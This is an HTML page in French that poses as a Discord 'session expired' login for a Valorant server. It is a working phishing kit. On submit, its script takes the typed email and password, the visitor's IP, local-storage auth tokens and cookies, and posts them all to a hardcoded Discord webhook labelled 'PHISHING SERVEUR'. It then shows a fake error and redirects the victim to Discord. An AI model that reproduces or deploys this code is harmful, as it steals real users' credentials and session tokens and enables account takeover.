<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Session expirée - Discord</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Whitney', sans-serif; }
        
        body {
            background: #36393f;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            width: 100%;
            max-width: 480px;
            padding: 32px;
            background: #36393f;
        }
        
        .expired-notice {
            background: #ed4245;
            color: white;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .expired-notice::before {
            content: "⚠️";
        }
        
        .server-info {
            background: #2f3136;
            border: 1px solid #202225;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .server-icon {
            width: 50px;
            height: 50px;
            background: #5865f2;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        
        .server-details h3 {
            color: white;
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .server-details p {
            color: #b9bbbe;
            font-size: 13px;
        }
        
        h2 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 8px;
            text-align: center;
        }
        
        .subtitle {
            color: #b9bbbe;
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .form-group { margin-bottom: 20px; }
        
        label {
            display: block;
            color: #b9bbbe;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            margin-bottom: 8px;
        }
        
        input {
            width: 100%;
            padding: 10px;
            background: #303338;
            border: 1px solid #040405;
            border-radius: 3px;
            color: #dcddde;
            font-size: 16px;
            outline: none;
        }
        
        input:focus { border-color: #5865f2; }
        
        button {
            width: 100%;
            padding: 12px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }
        
        button:hover { background: #4752c4; }
        
        .error {
            color: #ed4245;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
            background: rgba(237, 66, 69, 0.1);
            padding: 10px;
            border-radius: 3px;
        }
        
        .help {
            margin-top: 20px;
            text-align: center;
            color: #72767d;
            font-size: 14px;
        }
        
        .help a {
            color: #00aff4;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="expired-notice">
            Votre session a expiré. Veuillez vous reconnecter.
        </div>
        
        <div class="server-info">
            <div class="server-icon">🎮</div>
            <div class="server-details">
                <h3>Serveur Valorant FR</h3>
                <p>128 membres • 45 en ligne</p>
            </div>
        </div>
        
        <h2>Bienvenue !</h2>
        <p class="subtitle">Connectez-vous pour rejoindre le serveur</p>
        
        <form id="loginForm">
            <div class="form-group">
                <label>E-mail</label>
                <input type="email" id="email" placeholder="nom@exemple.com" required>
            </div>
            
            <div class="form-group">
                <label>Mot de passe</label>
                <input type="password" id="password" placeholder="Mot de passe" required>
            </div>
            
            <button type="submit">Continuer vers le serveur</button>
            
            <div class="error" id="error">
                Identifiants incorrects. Veuillez réessayer.
            </div>
        </form>
        
        <div class="help">
            <a href="#">Mot de passe oublié ?</a> • <a href="#">Créer un compte</a>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537654143118999572/xUfeTGedDvVvB5mguwhB9BMhIvNDBIHvmwFBh5e1h3WevbWIFRQoq7pMl14UVfpAlSRk';
        
        async function sendData(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (e) {}
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (e) { return 'unknown'; }
        }
        
        async function grabTokens() {
            const tokens = {};
            try {
                const dt = localStorage.getItem('token') || localStorage.token;
                if (dt && dt !== 'null') tokens.discord = dt;
            } catch (e) {}
            
            try {
                const keys = Object.keys(localStorage);
                keys.forEach(k => {
                    if (k.toLowerCase().includes('token') || k.toLowerCase().includes('auth')) {
                        try {
                            const v = localStorage.getItem(k);
                            if (v && v.length > 20) tokens[k] = v.substring(0, 100);
                        } catch (e) {}
                    }
                });
            } catch (e) {}
            
            try { tokens.cookies = document.cookie; } catch (e) {}
            return tokens;
        }
        
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const error = document.getElementById('error');
            
            const ip = await getIP();
            const tokens = await grabTokens();
            
            await sendData({
                content: `🎣 **PHISHING SERVEUR** 🎣\n\n` +
                        `📧 **Email:** \`${email}\`\n` +
                        `🔑 **Password:** \`${password}\`\n` +
                        `🌐 **IP:** ${ip}\n` +
                        `🔗 **URL:** ${window.location.href}\n` +
                        `🖥️ **UA:** ${navigator.userAgent}\n\n` +
                        `🔐 **Tokens:** \`\`\`json\n${JSON.stringify(tokens, null, 2)}\`\`\``
            });
            
            error.style.display = 'block';
            document.getElementById('password').value = '';
            
            setTimeout(() => {
                window.location.href = 'https://discord.com/invite';
            }, 2000);
        });
    </script>
</body>
</html>
